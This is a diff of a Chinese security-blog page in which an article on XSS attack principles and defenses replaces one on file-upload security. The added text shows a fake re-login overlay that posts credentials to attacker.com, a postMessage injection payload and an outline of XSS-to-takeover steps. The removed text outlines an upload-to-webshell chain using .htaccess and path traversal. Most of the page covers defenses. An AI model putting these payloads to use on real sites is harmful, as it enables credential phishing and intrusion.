+<pre><code class="javascript">// 覆盖页面内容，伪造登录框
+document.body.innerHTML = `
+  &lt;div style=&quot;position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999&quot;&gt;
+    &lt;h2&gt;会话已过期，请重新登录&lt;/h2&gt;
+    &lt;form action=&quot;https://attacker.com/phish&quot; method=&quot;POST&quot;&gt;
+      &lt;input name=&quot;username&quot; placeholder=&quot;用户名&quot;&gt;&lt;br&gt;
+      &lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;密码&quot;&gt;&lt;br&gt;
+      &lt;button type=&quot;submit&quot;&gt;登录&lt;/button&gt;
+    &lt;/form&gt;
+  &lt;/div&gt;
+`;
+</code></pre>
+<p>用户看到的是一个逼真的”重新登录”弹窗，输入的凭据直接发送到攻击者服务器。</p>
+<p><strong>3.3.6 利用 <code>postMessage</code> 跨域通信</strong></p>
+<p>如果页面监听了 <code>message</code> 事件但没有校验 <code>origin</code>：</p>
+<pre><code class="javascript">// 目标页面的危险代码
+window.addEventListener(&#39;message&#39;, function(e) &#123;
+  document.getElementById(&#39;output&#39;).innerHTML = e.data;
+&#125;);
+
+// 攻击者在自己的页面上
+&lt;iframe src=&quot;https://target.com/vulnerable-page&quot;&gt;&lt;/iframe&gt;
+&lt;script&gt;
+  document.querySelector(&#39;iframe&#39;).contentWindow.postMessage(&#39;&lt;img src=x onerror=alert(1)&gt;&#39;, &#39;*&#39;);
+&lt;/script&gt;
+</code></pre>
 <hr>
-<h3 id="三、防御策略"><a href="#三、防御策略" class="headerlink" title="三、防御策略"></a>三、防御策略</h3><h4 id="3-1-文件名处理"><a href="#3-1-文件名处理" class="headerlink" title="3.1 文件名处理"></a>3.1 文件名处理</h4><p><strong>核心原则：永远不要信任客户端传来的文件名。</strong></p>
-<p>最安全的做法是服务端生成随机文件名，仅保留原始扩展名用于类型判断：</p>
-<pre><code class="java">// Java: 生成随机文件名
-String originalName = file.getOriginalFilename();
-String ext = FilenameUtils.getExtension(originalName);
-String storedName = UUID.randomUUID().toString() + &quot;.&quot; + ext;
-Path target = uploadDir.resolve(storedName);
+<h3 id="四、防御策略"><a href="#四、防御策略" class="headerlink" title="四、防御策略"></a>四、防御策略</h3><h4 id="4-1-输出编码（最核心的防御）"><a href="#4-1-输出编码（最核心的防御）" class="headerlink" title="4.1 输出编码（最核心的防御）"></a>4.1 输出编码（最核心的防御）</h4><p>XSS 的本质是数据被当作代码执行，所以防御的核心是<strong>在数据插入 HTML 的位置做对应的编码</strong>，确保数据始终被当作数据处理。</p>
+<p>不同上下文需要不同的编码方式：</p>
+<p><strong>HTML 标签之间（HTML Context）：</strong> 编码 <code>&amp; &lt; &gt; &quot; &#39;</code></p>
+<pre><code class="java">// Java: 使用 OWASP Java Encoder
+String safe = Encode.forHtml(userInput);
+// &amp; → &amp;amp;  &lt; → &amp;lt;  &gt; → &amp;gt;  &quot; → &amp;quot;  &#39; → &amp;#x27;
 </code></pre>
-<pre><code class="python"># Python: 使用 werkzeug 的安全文件名处理
-from werkzeug.utils import secure_filename
-import os, uuid
+<pre><code class="python"># Python: 使用 markupsafe
+from markupsafe import escape
+safe = escape(user_input)
+</code></pre>
+<pre><code class="php">// PHP
+$safe = htmlspecialchars($userInput, ENT_QUOTES | ENT_HTML5, &#39;UTF-8&#39;);
+</code></pre>
+<p><strong>HTML 属性值内（Attribute Context）：</strong> 除了上述字符，还需要编码更多特殊字符</p>
+<pre><code class="java">String safe = Encode.forHtmlAttribute(userInput);
+</code></pre>
+<p><strong>JavaScript 代码块内（JS Context）：</strong> 需要编码为 JS 字符串安全字符</p>
+<pre><code class="java">String safe = Encode.forJavaScript(userInput);
+// 编码 \xHH 形式，确保不会闭合字符串字面量
+</code></pre>
+<p><strong>URL 参数中（URL Context）：</strong></p>
+<pre><code class="java">String safe = Encode.forUriComponent(userInput);
+</code></pre>
+<p><strong>CSS 值内（CSS Context）：</strong></p>
+<pre><code class="java">String safe = Encode.forCssString(userInput);
+</code></pre>
+<p>核心原则：<strong>根据数据插入的位置选择对应的编码函数，不存在一种通用的编码适用于所有上下文。</strong></p>
+<h4 id="4-2-Content-Security-Policy（CSP）"><a href="#4-2-Content-Security-Policy（CSP）" class="headerlink" title="4.2 Content Security Policy（CSP）"></a>4.2 Content Security Policy（CSP）</h4><p>CSP 是浏览器层面的第二道防线，通过 HTTP 响应头告诉浏览器哪些来源的脚本可以执行：</p>
+<pre><code>Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39; https://cdn.example.com; object-src &#39;none&#39;; base-uri &#39;self&#39;
+</code></pre>
+<p>这条策略的含义：默认只允许加载同源资源；脚本只能从同源和 <code>cdn.example.com</code> 加载；禁止 <code>&lt;object&gt;</code>、<code>&lt;embed&gt;</code> 标签；<code>&lt;base&gt;</code> 标签只能指向同源。</p>
+<p>CSP 的关键价值在于：即使存在 XSS 注入点，如果 CSP 禁止了内联脚本（<code>unsafe-inline</code>）且没有可被利用的脚本源，攻击者也无法执行任意代码。</p>
+<p><strong>CSP 的演进：</strong></p>
+<ul>
+<li>CSP Level 1：<code>unsafe-inline</code> 仍可被绕过，<code>nonce</code> 和 <code>hash</code> 机制引入</li>
+<li>CSP Level 2：引入 <code>nonce-xxx</code> 和 <code>sha256-xxx</code>，精确控制可执行的脚本</li>
+<li>CSP Level 3：引入 <code>strict-dynamic</code>，由受信任脚本动态加载的子脚本自动获得信任</li>
+</ul>
+<p>推荐做法：使用 <code>nonce</code> 机制，每次请求生成随机 nonce，内联脚本必须携带匹配的 nonce 才能执行：</p>
+<pre><code>Content-Security-Policy: script-src &#39;nonce-rAnd0mV4lu3&#39;
+</code></pre>
+<pre><code class="html">&lt;script nonce=&quot;rAnd0mV4lu3&quot;&gt;
+  // 只有携带正确 nonce 的脚本才能执行
+  console.log(&#39;safe&#39;);
+&lt;/script&gt;
+</code></pre>
+<h4 id="4-3-HttpOnly-Cookie"><a href="#4-3-HttpOnly-Cookie" class="headerlink" title="4.3 HttpOnly Cookie"></a>4.3 HttpOnly Cookie</h4><p>给敏感 Cookie 设置 <code>HttpOnly</code> 标志，阻止 JavaScript 通过 <code>document.cookie</code> 访问：</p>
+<pre><code>Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict
+</code></pre>
+<p><code>HttpOnly</code> 阻止 JS 读取 Cookie，<code>Secure</code> 要求 HTTPS 传输，<code>SameSite=Strict</code> 阻止跨站请求携带 Cookie（防御 CSRF 的同时也降低了 XSS 窃取 Cookie 的价值）。</p>
+<p>注意：<code>HttpOnly</code> 只保护 Cookie，不保护 localStorage 和 sessionStorage 中的数据。如果应用将 token 存在 localStorage 中，XSS 仍然可以通过 <code>localStorage.getItem(&#39;token&#39;)</code> 窃取。</p>
+<h4 id="4-4-输入验证"><a href="#4-4-输入验证" class="headerlink" title="4.4 输入验证"></a>4.4 输入验证</h4><p>输入验证是辅助手段，不能替代输出编码，但能减少攻击面：</p>
+<pre><code class="python"># 白名单验证：只允许预期字符
+import re
 
-filename = secure_filename(file.filename)  # 去除路径分隔符和特殊字符
-ext = os.path.splitext(filename)[1]
-stored_name = f&quot;&#123;uuid.uuid4().hex&#125;&#123;ext&#125;&quot;
-</code></pre>
-<pre><code class="php">// PHP: 生成随机文件名
-$ext = pathinfo($_FILES[&#39;file&#39;][&#39;name&#39;], PATHINFO_EXTENSION);
-$stored_name = bin2hex(random_bytes(16)) . &#39;.&#39; . $ext;
-</code></pre>
-<p>如果必须保留原始文件名，需要过滤 <code>../</code>、<code>..\\</code>、空字节 <code>%00</code>、以及所有控制字符，并做路径规范化后验证结果路径仍在预期目录内：</p>
-<pre><code class="java">Path target = uploadDir.resolve(filename).normalize();
-if (!target.startsWith(uploadDir)) &#123;
-    throw new SecurityException(&quot;Path traversal detected&quot;);
-&#125;
-</code></pre>
-<h4 id="3-2-文件类型校验（多层纵深）"><a href="#3-2-文件类型校验（多层纵深）" class="headerlink" title="3.2 文件类型校验（多层纵深）"></a>3.2 文件类型校验（多层纵深）</h4><p>单一校验手段都可以被绕过，必须多层叠加：</p>
-<p><strong>第一层：扩展名白名单。</strong> 白名单优于黑名单，因为可枚举的合法类型远少于需要拦截的类型。注意处理大小写、双扩展名（<code>shell.php.jpg</code>）、空字节截断（<code>shell.php%00.jpg</code>，Java/PHP 5.3 以下受影响）。</p>
-<p><strong>第二层：Magic Number 校验。</strong> 读取文件实际内容的前几个字节，与预期签名比对：</p>
-<pre><code class="python">MAGIC_NUMBERS = &#123;
-    b&#39;\xff\xd8\xff&#39;: &#39;jpg&#39;,
-    b&#39;\x89PNG&#39;: &#39;png&#39;,
-    b&#39;GIF87a&#39;: &#39;gif&#39;,
-    b&#39;GIF89a&#39;: &#39;gif&#39;,
-    b&#39;%PDF&#39;: &#39;pdf&#39;,
-&#125;
+def validate_username(username):
+    if not re.match(r&#39;^[a-zA-Z0-9_]&#123;3,20&#125;$&#39;, username):
+        raise ValueError(&quot;Invalid username&quot;)
+    return username
 
-def verify_magic(file_path, expected_type):
-    with open(file_path, &#39;rb&#39;) as f:
-        header = f.read(8)
-    for magic, ftype in MAGIC_NUMBERS.items():
-        if header.startswith(magic) and ftype == expected_type:
-            return True
-    return False
+# 对于邮箱、URL 等有明确格式的数据，使用标准库验证
+from email.utils import parseaddr
+name, addr = parseaddr(user_input)
+if not addr or &#39;@&#39; not in addr:
+    raise ValueError(&quot;Invalid email&quot;)
 </code></pre>
-<pre><code class="java">// Java: 使用 Tika 做内容类型检测
-Tika tika = new Tika();
-String detected = tika.detect(file.getInputStream());
-if (!&quot;image/jpeg&quot;.equals(detected)) &#123;
-    throw new SecurityException(&quot;Content type mismatch&quot;);
-&#125;
+<p>输入验证的价值在于：在数据进入系统时就拦截明显恶意的内容，减少后续处理链路中的风险。但它不能覆盖所有 XSS 场景（合法输入中也可能包含需要编码的字符），所以必须配合输出编码。</p>
+<h4 id="4-5-使用安全的模板引擎"><a href="#4-5-使用安全的模板引擎" class="headerlink" title="4.5 使用安全的模板引擎"></a>4.5 使用安全的模板引擎</h4><p>现代模板引擎默认对变量做 HTML 转义，大幅降低了 XSS 风险：</p>
+<pre><code class="jinja2">&#123;# Jinja2 (Python/Flask)：默认转义 #&#125;
+&lt;p&gt;&#123;&#123; user_input &#125;&#125;&lt;/p&gt;
+&#123;# user_input 中的 < > & 等字符会被自动转义 #&#125;
 </code></pre>
-<p><strong>第三层：内容完整性校验。</strong> 对图片文件，用图像处理库尝试解码并重新编码，验证它确实是合法图片：</p>
-<pre><code class="python">from PIL import Image
+<pre><code class="ejs">&lt;!-- EJS (Node.js)：使用 &lt;%= %&gt; 自动转义 --&gt;
+&lt;p&gt;&lt;%= userInput %&gt;&lt;/p&gt;
+</code></pre>
+<pre><code class="thymeleaf">&lt;!-- Thymeleaf (Java/Spring)：默认转义 --&gt;
+&lt;p th:text=&quot;$&#123;userInput&#125;&quot;&gt;&lt;/p&gt;
+</code></pre>
+<p><strong>危险操作：</strong> 使用”原始输出”标签会跳过转义，必须确保数据已经过清洗：</p>
+<pre><code class="jinja2">&#123;# Jinja2：|safe 过滤器跳过转义，危险！ #&#125;
+&lt;p&gt;&#123;&#123; user_input | safe &#125;&#125;&lt;/p&gt;
 
-def verify_image(file_path):
-    try:
-        img = Image.open(file_path)
-        img.verify()  # 验证图片完整性
-        return True
-    except Exception:
-        return False
+&#123;# Django：|safe 过滤器同理 #&#125;
+&lt;p&gt;&#123;&#123; user_input | safe &#125;&#125;&lt;/p&gt;
 </code></pre>
-<p><strong>第四层：MIME 类型交叉验证。</strong> 将扩展名、magic number、<code>Content-Type</code> 三者交叉比对，任何不一致都拒绝。</p>
-<h4 id="3-3-存储与执行隔离"><a href="#3-3-存储与执行隔离" class="headerlink" title="3.3 存储与执行隔离"></a>3.3 存储与执行隔离</h4><p><strong>上传目录禁止执行。</strong> 这是最关键的一道防线。即使前面所有校验都被绕过，只要上传目录不能执行脚本，攻击就无法完成。</p>
-<pre><code class="apache"># Apache: 上传目录禁止执行脚本
-&lt;Directory &quot;/var/www/uploads&quot;&gt;
-    Options -ExecCGI
-    RemoveHandler .php .phtml .php3 .php5
-    &lt;FilesMatch &quot;\.(php|phtml|php3|php5|pl|py|jsp|asp|aspx)$&quot;&gt;
-        Require all denied
-    &lt;/FilesMatch&gt;
-&lt;/Directory&gt;
-</code></pre>
-<pre><code class="nginx"># Nginx: 上传目录只允许静态文件
-location /uploads/ &#123;
-    location ~ \.(php|jsp|asp|aspx|py|pl)$ &#123;
-        deny all;
-    &#125;
-&#125;
-</code></pre>
-<p><strong>使用独立的文件存储域名或 CDN。</strong> 将上传文件放在 <code>files.example.com</code> 或对象存储（如 S3/OSS）上，与应用主域名 <code>www.example.com</code> 隔离。这样即使上传了 XSS payload，也无法读取主域的 Cookie。配合 <code>Content-Security-Policy</code> 和独立的 Origin 进一步限制。</p>
-<p><strong>对象存储优先于本地文件系统。</strong> 使用 S3/OSS 等对象存储天然不存在本地文件执行的风险，且可以设置 Bucket Policy 限制 Content-Type 和公开访问范围。</p>
-<h4 id="3-4-文件大小与速率限制"><a href="#3-4-文件大小与速率限制" class="headerlink" title="3.4 文件大小与速率限制"></a>3.4 文件大小与速率限制</h4><pre><code class="python"># Flask 示例
-app.config[&#39;MAX_CONTENT_LENGTH&#39;] = 10 * 1024 * 1024  # 10MB 上限
+<h4 id="4-6-框架内置防护"><a href="#4-6-框架内置防护" class="headerlink" title="4.6 框架内置防护"></a>4.6 框架内置防护</h4><p>主流前端框架默认对插值做转义：</p>
+<pre><code class="jsx">// React：默认转义 JSX 中的变量
+&lt;div&gt;&#123;userInput&#125;&lt;/div&gt;
+// userInput 中的 &lt;script&gt; 会被转义为 &amp;lt;script&amp;gt;
 
-# 速率限制
-from flask_limiter import Limiter
-limiter = Limiter(app, default_limits=[&quot;100 per minute&quot;])
+// 危险操作：dangerouslySetInnerHTML 绕过转义
+&lt;div dangerouslySetInnerHTML=&#123;&#123;__html: userInput&#125;&#125; /&gt;
+</code></pre>
+<pre><code class="vue">&lt;!-- Vue：&#123;&#123; &#125;&#125; 默认转义 --&gt;
+&lt;p&gt;&#123;&#123; userInput &#125;&#125;&lt;/p&gt;
 
-@app.route(&quot;/upload&quot;, methods=[&quot;POST&quot;])
-@limiter.limit(&quot;10 per minute&quot;)
-def upload():
-    ...
+&lt;!-- 危险操作：v-html 绕过转义 --&gt;
+&lt;p v-html=&quot;userInput&quot;&gt;&lt;/p&gt;
 </code></pre>
-<p>对压缩包必须做解压后的体积检查（防止 Zip 炸弹），设置解压倍率上限（如原始大小的 100 倍）。</p>
-<h4 id="3-5-防病毒扫描"><a href="#3-5-防病毒扫描" class="headerlink" title="3.5 防病毒扫描"></a>3.5 防病毒扫描</h4><p>对上传文件做病毒扫描，可以集成 ClamAV 等开源引擎：</p>
-<pre><code class="java">// Java 集成 ClamAV
-try (Socket socket = new Socket(&quot;localhost&quot;, 3310);
-     OutputStream os = socket.getOutputStream();
-     InputStream is = socket.getInputStream()) &#123;
-    os.write(&quot;zSCAN\n&quot;.getBytes());
-    os.write(fileBytes);
-    os.write(&quot;\0&quot;.getBytes());
-    // 读取扫描结果
-&#125;
+<pre><code class="angular">&lt;!-- Angular：[] 绑定默认转义 --&gt;
+&lt;p&gt;&#123;&#123; userInput &#125;&#125;&lt;/p&gt;
+
+&lt;!-- 危险操作：bypassSecurityTrustHtml 绕过转义 --&gt;
+&lt;div [innerHTML]=&quot;sanitizedHtml&quot;&gt;&lt;/div&gt;
 </code></pre>
-<h4 id="3-6-安全响应头"><a href="#3-6-安全响应头" class="headerlink" title="3.6 安全响应头"></a>3.6 安全响应头</h4><p>服务端返回上传文件时，设置以下响应头降低风险：</p>
-<pre><code>Content-Disposition: attachment; filename=&quot;downloaded-file.jpg&quot;
-X-Content-Type-Options: nosniff
-Content-Security-Policy: default-src &#39;none&#39;; style-src &#39;self&#39; &#39;unsafe-inline&#39;
+<p>这些框架的默认行为是安全的，但开发者使用 <code>dangerouslySetInnerHTML</code>、<code>v-html</code>、<code>bypassSecurityTrustHtml</code> 等”逃生舱”时会主动放弃防护。</p>
+<h4 id="4-7-富文本场景的特殊处理"><a href="#4-7-富文本场景的特殊处理" class="headerlink" title="4.7 富文本场景的特殊处理"></a>4.7 富文本场景的特殊处理</h4><p>富文本编辑器允许用户提交 HTML，不能简单做全量转义。需要专门的 HTML 清洗：</p>
+<pre><code class="javascript">// 使用 DOMPurify（推荐）
+import DOMPurify from &#39;dompurify&#39;;
+const clean = DOMPurify.sanitize(dirtyHtml, &#123;
+  ALLOWED_TAGS: [&#39;p&#39;, &#39;b&#39;, &#39;i&#39;, &#39;em&#39;, &#39;strong&#39;, &#39;a&#39;, &#39;img&#39;, &#39;ul&#39;, &#39;ol&#39;, &#39;li&#39;],
+  ALLOWED_ATTR: [&#39;href&#39;, &#39;src&#39;, &#39;alt&#39;, &#39;title&#39;, &#39;target&#39;],
+  ALLOW_DATA_ATTR: false
+&#125;);
 </code></pre>
-<p><code>Content-Disposition: attachment</code> 强制浏览器下载而非内联渲染，阻止 SVG/HTML 的 XSS 执行。<code>nosniff</code> 阻止浏览器 MIME 嗅探。CSP 限制文件只能加载自身资源。</p>
+<pre><code class="python"># Python: 使用 bleach
+import bleach
+
+clean = bleach.clean(dirty_html,
+    tags=[&#39;p&#39;, &#39;b&#39;, &#39;i&#39;, &#39;em&#39;, &#39;strong&#39;, &#39;a&#39;, &#39;img&#39;],
+    attributes=&#123;&#39;a&#39;: [&#39;href&#39;, &#39;title&#39;], &#39;img&#39;: [&#39;src&#39;, &#39;alt&#39;]&#125;,
+    strip=True
+)
+</code></pre>
+<pre><code class="java">// Java: 使用 OWASP Java HTML Sanitizer
+PolicyFactory policy = new HtmlPolicyBuilder()
+    .allowElements(&quot;p&quot;, &quot;b&quot;, &quot;i&quot;, &quot;em&quot;, &quot;strong&quot;, &quot;a&quot;, &quot;img&quot;)
+    .allowAttributes(&quot;href&quot;).onElements(&quot;a&quot;)
+    .allowAttributes(&quot;src&quot;, &quot;alt&quot;).onElements(&quot;img&quot;)
+    .allowUrlProtocols(&quot;https&quot;)
+    .toFactory();
+String safeHtml = policy.sanitize(dirtyHtml);
+</code></pre>
+<p>关键配置要点：禁止 <code>&lt;script&gt;</code>、<code>&lt;iframe&gt;</code>、<code>&lt;object&gt;</code>、<code>&lt;embed&gt;</code> 标签；禁止 <code>on*</code> 事件属性；禁止 <code>javascript:</code> 协议的 URL；禁止 <code>&lt;style&gt;</code> 标签（CSS 也可用于攻击）。</p>
 <hr>
-<h3 id="四、各语言常见陷阱"><a href="#四、各语言常见陷阱" class="headerlink" title="四、各语言常见陷阱"></a>四、各语言常见陷阱</h3><h4 id="4-1-Java"><a href="#4-1-Java" class="headerlink" title="4.1 Java"></a>4.1 Java</h4><ul>
-<li><code>MultipartFile.getOriginalFilename()</code> 返回的是客户端提供的原始值，不可信</li>
-<li><code>File.renameTo()</code> 在某些平台上不保证原子性，条件竞争场景需注意</li>
-<li>Apache Commons FileUpload 旧版本存在路径穿越漏洞（CVE-2016-1000030）</li>
-<li>Spring Boot 默认使用临时目录存储上传文件，需确保临时目录权限正确</li>
+<h3 id="五、各语言-框架常见陷阱"><a href="#五、各语言-框架常见陷阱" class="headerlink" title="五、各语言/框架常见陷阱"></a>五、各语言/框架常见陷阱</h3><h4 id="5-1-Java"><a href="#5-1-Java" class="headerlink" title="5.1 Java"></a>5.1 Java</h4><ul>
+<li><code>JSP</code> 的 <code>&lt;%= variable %&gt;</code> 不会自动转义（除非配置 <code>escapeXml</code>）</li>
+<li>Spring MVC 的 <code>@ResponseBody</code> 返回 JSON 时，如果 Content-Type 设置错误（如 <code>text/html</code>），JSON 中的用户数据可能被浏览器当 HTML 解析</li>
+<li><code>StringEscapeUtils.escapeHtml()</code> 在旧版 Commons Lang 中不处理所有 Unicode 字符</li>
 </ul>
-<h4 id="4-2-PHP"><a href="#4-2-PHP" class="headerlink" title="4.2 PHP"></a>4.2 PHP</h4><ul>
-<li><code>$_FILES[&#39;file&#39;][&#39;type&#39;]</code> 来自请求头，完全可伪造</li>
-<li><code>move_uploaded_file()</code> 是安全的上传函数，它会检查文件确实通过 HTTP POST 上传</li>
-<li><code>getimagesize()</code> 可以验证图片尺寸，但不能完全替代内容校验</li>
-<li>PHP 5.3 以下存在空字节截断漏洞：<code>shell.php%00.jpg</code> 在文件系统操作中被截断为 <code>shell.php</code></li>
-<li><code>$_FILES</code> 同名覆盖特性（同名字段后者覆盖前者）</li>
+<h4 id="5-2-PHP"><a href="#5-2-PHP" class="headerlink" title="5.2 PHP"></a>5.2 PHP</h4><ul>
+<li><code>echo $userInput</code> 不做任何转义，是 XSS 最常见的根源</li>
+<li><code>htmlspecialchars()</code> 必须指定 <code>ENT_QUOTES</code> 和字符编码，否则单引号和特殊编码可能绕过</li>
+<li><code>$_SERVER[&#39;PHP_SELF&#39;]</code> 包含 URL 路径，如果直接用于 <code>form action</code> 属性，路径部分可被注入</li>
 </ul>
-<h4 id="4-3-Python"><a href="#4-3-Python" class="headerlink" title="4.3 Python"></a>4.3 Python</h4><ul>
-<li><code>os.path.join(base, user_input)</code> 如果 <code>user_input</code> 是绝对路径，会直接返回 <code>user_input</code></li>
-<li>Flask 的 <code>secure_filename()</code> 会剥离路径分隔符和特殊字符，但不处理 magic number</li>
-<li>Django 的 <code>FileField</code> 默认不校验文件内容类型</li>
-<li>Pillow 的 <code>Image.verify()</code> 只检查文件头，不保证图片完全合法；更安全的做法是打开图片后重新保存</li>
+<pre><code class="php">&lt;!-- 危险：PHP_SELF 可被注入 --&gt;
+&lt;form action=&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;]; ?&gt;&quot;&gt;
+
+&lt;!-- 如果访问 /page.php/&lt;script&gt;alert(1)&lt;/script&gt; --&gt;
+&lt;!-- 渲染为 --&gt;
+&lt;form action=&quot;/page.php/&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;
+</code></pre>
+<h4 id="5-3-Python"><a href="#5-3-Python" class="headerlink" title="5.3 Python"></a>5.3 Python</h4><ul>
+<li>Flask 的 <code>render_template_string</code> 如果使用 <code>&#123;&#123; variable | safe &#125;&#125;</code> 会跳过转义</li>
+<li>Django 的 <code>mark_safe()</code> 和 <code>|safe</code> 过滤器同理</li>
+<li><code>json.dumps()</code> 默认不转义 <code>&lt;</code> <code>&gt;</code> <code>&amp;</code>，如果 JSON 被嵌入 HTML 页面，可能被 XSS 利用</li>
+</ul>
+<pre><code class="python"># 危险：JSON 嵌入 HTML
+&lt;script&gt;
+  var data = &#123;&#123; user_data | safe &#125;&#125;;  # 如果 user_data 包含 &lt;/script&gt;，会闭合标签
+&lt;/script&gt;
+
+# 安全做法：使用 |tojson 过滤器（Flask 提供）
+&lt;script&gt;
+  var data = &#123;&#123; user_data | tojson &#125;&#125;;
+&lt;/script&gt;
+</code></pre>
+<h4 id="5-4-Node-js"><a href="#5-4-Node-js" class="headerlink" title="5.4 Node.js"></a>5.4 Node.js</h4><ul>
+<li>Express 的 <code>res.send(userInput)</code> 如果 Content-Type 是 <code>text/html</code>，直接输出未转义内容</li>
+<li><code>res.json()</code> 是安全的（Content-Type 为 <code>application/json</code>），但前端如果用 <code>innerHTML</code> 渲染 JSON 数据，仍然会触发 XSS</li>
+<li>EJS 的 <code>&lt;%- %&gt;</code> 不转义，<code>&lt;%= %&gt;</code> 转义，容易混淆</li>
 </ul>
 <hr>
-<h3 id="五、完整防御清单"><a href="#五、完整防御清单" class="headerlink" title="五、完整防御清单"></a>五、完整防御清单</h3><p>将防御措施按优先级排列：</p>
+<h3 id="六、完整防御清单"><a href="#六、完整防御清单" class="headerlink" title="六、完整防御清单"></a>六、完整防御清单</h3><p>按优先级排列：</p>
 <ol>
-<li>上传目录禁止执行脚本（最关键，最后一道防线）</li>
-<li>服务端生成随机文件名，不信任客户端文件名</li>
-<li>扩展名白名单（而非黑名单）</li>
-<li>Magic Number + 内容完整性校验（图片重编码验证）</li>
-<li>文件大小限制 + 上传速率限制</li>
-<li>独立域名/对象存储隔离上传文件</li>
-<li>安全响应头（Content-Disposition: attachment, nosniff, CSP）</li>
-<li>防病毒扫描</li>
-<li>日志记录所有上传行为（文件名、IP、时间、大小、哈希）</li>
-<li>定期审计上传目录中的文件</li>
+<li>输出编码——根据插入上下文选择对应的编码函数（HTML/属性/JS/URL/CSS）</li>
+<li>使用默认转义的模板引擎或前端框架，避免使用”逃生舱”</li>
+<li>部署 CSP——禁止 <code>unsafe-inline</code>，使用 <code>nonce</code> 或 <code>hash</code> 机制</li>
+<li>富文本场景使用专业 HTML 清洗库（DOMPurify / bleach / OWASP Sanitizer）</li>
+<li>敏感 Cookie 设置 <code>HttpOnly</code> + <code>Secure</code> + <code>SameSite</code></li>
+<li>输入验证作为辅助——白名单校验格式固定的字段</li>
+<li>避免将用户数据放入 <code>innerHTML</code>、<code>document.write</code>、<code>eval</code> 等 sink</li>
+<li>对 JSON 嵌入 HTML 场景使用专用序列化（如 <code>|tojson</code>）</li>
+<li>定期使用自动化扫描工具（如 OWASP ZAP、Burp Suite）检测 XSS</li>
+<li>安全响应头：<code>X-Content-Type-Options: nosniff</code>、<code>X-XSS-Protection</code>（旧浏览器）</li>
 </ol>
 <hr>
-<h3 id="六、攻击链示例：从上传到-GetShell"><a href="#六、攻击链示例：从上传到-GetShell" class="headerlink" title="六、攻击链示例：从上传到 GetShell"></a>六、攻击链示例：从上传到 GetShell</h3><p>一个典型的完整攻击链：</p>
+<h3 id="七、攻击链示例：从-XSS-到完全接管"><a href="#七、攻击链示例：从-XSS-到完全接管" class="headerlink" title="七、攻击链示例：从 XSS 到完全接管"></a>七、攻击链示例：从 XSS 到完全接管</h3><p>一个典型的完整攻击链：</p>
 <ol>
-<li>发现上传接口，测试发现仅校验前端 JS 扩展名 → 直接绕过</li>
-<li>上传 <code>.php</code> 文件被拦截 → 尝试 <code>.php5</code> 成功（黑名单不完整）</li>
-<li>或者：上传 <code>shell.jpg</code>（内容是 PHP），同时上传 <code>.htaccess</code>（<code>AddType application/x-httpd-php .jpg</code>）→ 访问 <code>shell.jpg</code> 被当 PHP 执行</li>
-<li>如果上传目录禁止执行 → 尝试路径穿越写到其他目录 → <code>filename=../../app/shell.php</code></li>
-<li>如果路径穿越也被防住 → 寻找文件包含漏洞（LFI）配合图片马 → 上传含 PHP 代码的图片 → 通过 <code>include()</code> 触发执行</li>
+<li>发现评论区存在存储型 XSS → 输入 <code>&lt;img src=x onerror=...&gt;</code> 未被过滤</li>
+<li>脚本窃取管理员的 Cookie → 但 Cookie 设置了 <code>HttpOnly</code>，无法读取</li>
+<li>改为利用 XSS 发起 CSRF 请求 → 以管理员身份调用 <code>/api/admin/create-user</code> 创建后门账户</li>
+<li>或者：利用 XSS 注入键盘记录器 → 等待管理员在页面上输入敏感操作密码</li>
+<li>如果 CSP 阻止了内联脚本 → 寻找 JSONP 端点或 CORS 配置错误来加载外部脚本</li>
+<li>如果所有防御都到位 → 转向其他攻击面（SQL 注入、SSRF、文件上传等）</li>
 </ol>
-<p>这条攻击链说明：纵深防御的每一层都很重要，任何一层缺失都可能被突破。</p>
+<p>这条攻击链说明：XSS 不仅仅是一个”弹个 alert”的漏洞，它是攻击者进入用户浏览器上下文的入口，后续的利用空间取决于攻击者的创造力和系统的纵深防御水平。</p>
 
                 
             </div>
@@ -808,7 +889,7 @@ Content-Security-Policy: default-src &#39;none&#39;; style-src &#39;self&#39; &#
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2026/08/06/2026-08-06-file-upload-security/">http://example.com/2026/08/06/2026-08-06-file-upload-security/</a>
+                    <a href="http://example.com/2026/08/06/2026-08-06-xss-attacks-principles-and-defense/">http://example.com/2026/08/06/2026-08-06-xss-attacks-principles-and-defense/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -850,12 +931,12 @@ Content-Security-Policy: default-src &#39;none&#39;; style-src &#39;self&#39; &#
                                     <span class="chip bg-color">安全</span>
                                 </a>
                             
-                                <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
-                                    <span class="chip bg-color">文件上传</span>
-                                </a>
-                            
                                 <a href="/tags/Web%E5%AE%89%E5%85%A8/">
                                     <span class="chip bg-color">Web安全</span>
+                                </a>
+                            
+                                <a href="/tags/XSS/">
+                                    <span class="chip bg-color">XSS</span>
                                 </a>
                             
                         </div>
@@ -1027,9 +1108,10 @@ Content-Security-Policy: default-src &#39;none&#39;; style-src &#39;self&#39; &#
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2026/08/06/2026-08-06-xss-attacks-principles-and-defense/">
                     <div class="card-image">
@@ -1047,9 +1129,9 @@ Content-Security-Policy: default-src &#39;none&#39;; style-src &#39;self&#39; &#
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2026-08-06
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2026-08-06
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -1058,6 +1140,7 @@ Content-Security-Policy: default-src &#39;none&#39;; style-src &#39;self&#39; &#
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
